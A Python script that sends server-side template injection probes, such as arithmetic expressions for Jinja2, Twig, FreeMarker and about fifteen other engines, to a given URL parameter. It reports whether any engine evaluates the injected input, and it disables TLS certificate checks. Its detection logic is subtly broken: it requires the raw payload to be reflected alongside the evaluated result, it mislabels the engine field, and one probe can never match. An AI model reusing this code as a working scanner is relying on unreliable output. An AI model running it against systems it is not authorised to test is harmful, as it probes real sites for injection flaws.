#!/usr/bin/env python
"""ssti_probe.py — Server-Side Template Injection tester (Tplmap-style).

Tests SSTI across major template engines (Jinja2/Twig/FreeMarker/Velocity/
Smarty/Mako/Handlebars/EJS/Pug/JSP/ASP) by injecting math expressions and
checking if the evaluated result appears in the response (7*7 → 49).

Usage: python ssti_probe.py <url> [--param name] [--method GET|POST]
       [--data 'k=v'] [--concurrency 6]
"""
import argparse, json, sys, urllib.request, urllib.parse, urllib.error, ssl, concurrent.futures, re

PAYLOADS = [
    ("jinja2_expr", "{{7*7}}", "49"),
    ("jinja2_str", "{{7*'7'}}", "7777777"),
    ("twig_expr", "{{7*7}}", "49"),
    ("twig_str", "{{'7'*7}}", "7777777"),
    ("freemarker", "${7*7}", "49"),
    ("velocity", "#set($x=7*7)$x", "49"),
    ("smarty", "{7*7}", "49"),
    ("mako", "${7*7}", "49"),
    ("handlebars", "{{multiply 7 7}}", "49"),
    ("ejs", "<%=7*7%>", "49"),
    ("pug", "=7*7", "49"),
    ("jsp_expr", "${7*7}", "49"),
    ("asp", "<%=7*7%>", "49"),
    ("erb", "<%=7*7%>", "49"),
    ("go_text", "{{.}}", ""),
    ("pebble", "{{7*7}}", "49"),
    ("thymeleaf", "[[${7*7}]]", "49"),
    ("stringtemplate", "<7*7>", "49"),
]

def test(url, param, payload, expected, method, data_tmpl, ctx):
    try:
        if method == "POST":
            post = data_tmpl.replace("__INJECT__", urllib.parse.quote(payload))
            req = urllib.request.Request(url, data=post.encode(), method="POST")
        else:
            sep = "&" if "?" in url else "?"
            req = urllib.request.Request(f"{url}{sep}{param}={urllib.parse.quote(payload)}")
        req.add_header("User-Agent", "Mozilla/5.0 (compatible; SstiProbe/1.0)")
        if method == "POST": req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with urllib.request.urlopen(req, context=ctx, timeout=15) as r:
            body = r.read(50000).decode("utf-8", errors="replace")
            reflected = payload in body
            evaluated = expected in body if expected else False
            return {"engine": payload, "expected": expected, "reflected": reflected, "evaluated": evaluated, "ssti": evaluated and reflected}
    except urllib.error.HTTPError as e:
        try: body = e.read(50000).decode("utf-8","replace")
        except: body = ""
        reflected = payload in body; evaluated = expected in body if expected else False
        return {"engine": payload, "reflected": reflected, "evaluated": evaluated, "ssti": evaluated and reflected, "status": e.code}
    except: pass
    return None

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("url"); ap.add_argument("--param", required=True)
    ap.add_argument("--method", choices=["GET","POST"], default="GET")
    ap.add_argument("--data", default="")
    ap.add_argument("--concurrency", type=int, default=6)
    args = ap.parse_args()
    ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
    data_tmpl = args.data or f"{args.param}=__INJECT__"
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.concurrency) as pool:
        futures = {pool.submit(test, args.url, args.param, p[1], p[2], args.method, data_tmpl, ctx): p[0] for p in PAYLOADS}
        for fut in concurrent.futures.as_completed(futures):
            r = fut.result()
            if r: r["engine_label"] = futures[fut]; results.append(r)
    confirmed = [r for r in results if r.get("ssti")]
    print(json.dumps({"target": args.url, "param": args.param, "ok": True, "payloads_tested": len(results),
        "confirmed": len(confirmed),
        "verdict": "SSTI CONFIRMED — template engine evaluates attacker input" if confirmed else "no SSTI signal",
        "results": results, "confirmed_details": confirmed,
        "note": "evaluated=true means the server executed the math (7*7→49) — SSTI. Engine identified by which payload evaluated."}, indent=2))

if __name__ == "__main__":
    main()
